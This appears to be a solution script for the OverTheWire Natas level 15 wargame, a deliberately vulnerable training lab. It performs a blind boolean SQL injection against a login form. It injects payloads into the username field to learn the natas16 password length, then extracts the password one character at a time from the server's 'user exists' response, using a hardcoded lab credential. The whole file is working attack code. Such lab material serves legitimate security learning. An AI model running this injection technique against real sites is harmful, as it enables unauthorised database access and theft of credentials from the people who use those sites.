#!/usr/local/bin/python3
mystring = "azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890"

import  urllib, base64,http.client
from base64 import b64encode

base64string = b64encode(b"natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J").decode("utf-8").replace('\n','')
headers = {"Authorization": "Basic %s" % base64string,"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}

conn = http.client.HTTPConnection("natas15.natas.labs.overthewire.org")
pw=""
for i in range(33):
	query="natas16\" AND length(password)="+str(i)+"#"
	params = urllib.parse.urlencode({'username':query})
	conn.request("POST","/index.php",params,headers)
	response = conn.getresponse()
	if "This user exists" in str(response.read()):
		print(i)
		break
while len(pw)!=32:
	for p in mystring:
		query="natas16\" AND password like binary \""+pw+p+"%\"#"
		params = urllib.parse.urlencode({'username': query})
		conn.request("POST", "/index.php", params, headers)
		response = conn.getresponse()
		if "This user exists" in str(response.read()):
			pw+=p
			print(pw)
			continue
